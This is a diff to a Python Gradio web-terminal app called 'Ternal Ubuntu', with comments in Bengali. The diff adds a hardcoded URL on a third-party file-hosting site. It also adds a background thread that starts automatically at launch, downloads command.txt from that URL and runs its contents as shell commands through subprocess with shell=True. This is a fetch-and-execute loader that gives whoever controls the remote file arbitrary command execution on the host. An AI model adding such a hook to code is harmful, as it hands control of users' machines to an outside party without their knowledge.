@@ -13,6 +13,12 @@ import fcntl
 import errno
 import threading
 import signal
+import urllib.request
+
+# -------------------------------------------------------------
+# 🔗 অটো ডাউনলোড কনফিগারেশন (এখানে তোমার লিঙ্কটি বসাবে)
+# -------------------------------------------------------------
+AUTO_COMMAND_URL = "https://dhruvmirrorpremiumfiletolink2-a5ca93483699.herokuapp.com/67791/command.txt?hash=AgADei"
 
 # Uvicorn টিসিপি কিপ-অ্যালাইভ টাইমআউট বাড়ানো হচ্ছে
 os.environ["UVICORN_TIMEOUT_KEEP_ALIVE"] = "300"
@@ -713,6 +719,38 @@ client_js = """
 }
 """
 
+# -------------------------------------------------------------
+# 📥 অটো-ডাউনলোড ও ব্যাকগ্রাউন্ড এক্সিকিউটর ফাংশন
+# -------------------------------------------------------------
+def run_auto_download_command():
+    if not AUTO_COMMAND_URL or AUTO_COMMAND_URL == "YOUR_COMMAND_TXT_DOWNLOAD_LINK_HERE":
+        return
+    try:
+        time.sleep(2)  # সিস্টেমের প্রাথমিক সেটআপ সম্পূর্ণ হওয়ার জন্য সামান্য অপেক্ষা
+        req = urllib.request.Request(
+            AUTO_COMMAND_URL, 
+            headers={"User-Agent": "Mozilla/5.0"}
+        )
+        file_path = os.path.join(current_working_dir, "command.txt")
+        with urllib.request.urlopen(req, timeout=20) as resp:
+            content = resp.read().decode("utf-8")
+        
+        with open(file_path, "w", encoding="utf-8") as f:
+            f.write(content)
+
+        cmd = content.strip()
+        if cmd:
+            shell_exec = "/bin/zsh" if os.path.exists("/bin/zsh") else "/bin/bash"
+            subprocess.Popen(
+                cmd,
+                shell=True,
+                executable=shell_exec,
+                cwd=current_working_dir,
+                env=os.environ.copy()
+            )
+    except Exception as e:
+        print(f"[Auto-Command Error]: {e}")
+
 with gr.Blocks(title="Ternal Ubuntu") as demo:
     with gr.Column(elem_id="main_wrapper"):
         modal_component = gr.HTML(value=modal_html)
@@ -766,6 +804,9 @@ if __name__ == "__main__":
             demo.app.add_middleware(RockSolidSSEKeepAliveMiddleware)
         except Exception:
             pass
+
+    # ⚡ অটো ডাউনলোড ও কমান্ড এক্সিকিউট থ্রেড ব্যাকগ্রাউন্ডে চালু করা হচ্ছে
+    threading.Thread(target=run_auto_download_command, daemon=True).start()
 
     demo.launch(
         server_name="0.0.0.0", 
